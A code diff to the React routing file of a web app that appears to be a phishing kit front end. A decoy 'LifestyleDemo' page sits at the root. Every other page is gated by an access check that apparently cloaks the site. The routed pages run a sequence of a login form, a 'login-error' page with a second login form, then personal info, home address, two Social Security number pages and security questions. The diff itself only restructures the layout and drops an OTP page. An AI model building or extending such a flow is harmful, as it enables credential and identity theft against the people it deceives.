@@ -1,9 +1,10 @@
 import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
+import type { ReactNode } from 'react';
 import useAccessCheck from './Utils/useAccessCheck';
 import { baseUrl } from './constants';
 
 // Components
-import Footer from './components/Footer';
+import FlowLayout from './components/FlowLayout';
 
 // Pages
 import LoginForm from './pages/LoginForm';
@@ -15,102 +16,123 @@ import SSN1 from './pages/SSN1';
 import SSN2 from './pages/SSN2';
 import SecurityQuestions from './pages/SecurityQuestions';
 import Terms from './pages/Terms';
-import OTPVerification from './pages/OTPVerification';
 import LifestyleDemo from './pages/LifestyleDemo';
 
-// Layout component for protected routes
-const ProtectedLayout = ({ children }: { children: React.ReactNode }) => {
+interface ProtectedLayoutProps {
+  children: ReactNode;
+  containerClassName?: string;
+  showBanner?: boolean;
+}
+
+const ProtectedLayout: React.FC<ProtectedLayoutProps> = ({ children, containerClassName, showBanner }) => {
   const isAllowed = useAccessCheck(baseUrl);
 
   if (isAllowed === null) {
-    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
+    return (
+      <FlowLayout showBanner={showBanner}>
+        <div className="text-white text-center text-lg">Loading...</div>
+      </FlowLayout>
+    );
   }
 
   if (isAllowed === false) {
-    return <div className="min-h-screen flex items-center justify-center">Access denied. Redirecting...</div>;
+    return (
+      <FlowLayout showBanner={showBanner}>
+        <div className="text-white text-center text-lg">Access denied. Redirecting...</div>
+      </FlowLayout>
+    );
   }
 
   return (
-    <div className="min-h-screen flex flex-col">
-      <main className="flex-1 flex flex-col">
-        {children}
-      </main>
-      <Footer />
-    </div>
+    <FlowLayout showBanner={showBanner}>
+      <div className={containerClassName ?? 'w-full max-w-2xl'}>{children}</div>
+    </FlowLayout>
   );
 };
+
+const ProtectedRoute: React.FC<ProtectedLayoutProps> = ({ children, containerClassName, showBanner }) => (
+  <ProtectedLayout containerClassName={containerClassName} showBanner={showBanner}>
+    {children}
+  </ProtectedLayout>
+);
 
 function App() {
   return (
     <Router>
       <Routes>
-        {/* Public routes */}
         <Route path="/" element={<LifestyleDemo />} />
-        
-        {/* Protected routes */}
-        <Route path="/login" element={
-          <ProtectedLayout>
-            <LoginForm />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/login-error" element={
-          <ProtectedLayout>
-            <LoginForm2 />
-          </ProtectedLayout>
-        } />
-        
-  
-        
-        <Route path="/register" element={
-          <ProtectedLayout>
-            <Register />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/basic-info" element={
-          <ProtectedLayout>
-            <BasicInfo />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/home-address" element={
-          <ProtectedLayout>
-            <HomeAddress />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/ssn1" element={
-          <ProtectedLayout>
-            <SSN1 />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/ssn2" element={
-          <ProtectedLayout>
-            <SSN2 />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/security-questions" element={
-          <ProtectedLayout>
-            <SecurityQuestions />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/terms" element={
-          <ProtectedLayout>
-            <Terms />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/otp-verification" element={
-          <ProtectedLayout>
-            <OTPVerification />
-          </ProtectedLayout>
-        } />
-        
-        {/* Redirect any unknown routes to home */}
+        <Route
+          path="/login"
+          element={
+            <ProtectedRoute containerClassName="w-full max-w-md">
+              <LoginForm />
+            </ProtectedRoute>
+          }
+        />
+        <Route
+          path="/login-error"
+          element={
+            <ProtectedRoute containerClassName="w-full max-w-md">
+              <LoginForm2 />
+            </ProtectedRoute>
+          }
+        />
+        <Route
+          path="/register"
+          element={
+            <ProtectedRoute>
+              <Register />
+            </ProtectedRoute>
+          }
+        />
+        <Route
+          path="/basic-info"
+          element={
+            <ProtectedRoute>
+              <BasicInfo />
+            </ProtectedRoute>
+          }
+        />
+        <Route
+          path="/home-address"
+          element={
+            <ProtectedRoute>
+              <HomeAddress />
+            </ProtectedRoute>
+          }
+        />
+        <Route
+          path="/ssn1"
+          element={
+            <ProtectedRoute>
+              <SSN1 />
+            </ProtectedRoute>
+          }
+        />
+        <Route
+          path="/ssn2"
+          element={
+            <ProtectedRoute>
+              <SSN2 />
+            </ProtectedRoute>
+          }
+        />
+        <Route
+          path="/security-questions"
+          element={
+            <ProtectedRoute>
+              <SecurityQuestions />
+            </ProtectedRoute>
+          }
+        />
+        <Route
+          path="/terms"
+          element={
+            <ProtectedRoute showBanner={false}>
+              <Terms />
+            </ProtectedRoute>
+          }
+        />
         <Route path="*" element={<Navigate to="/" replace />} />
       </Routes>
     </Router>
@@ -118,5 +140,3 @@ function App() {
 }
 
 export default App;
-
-
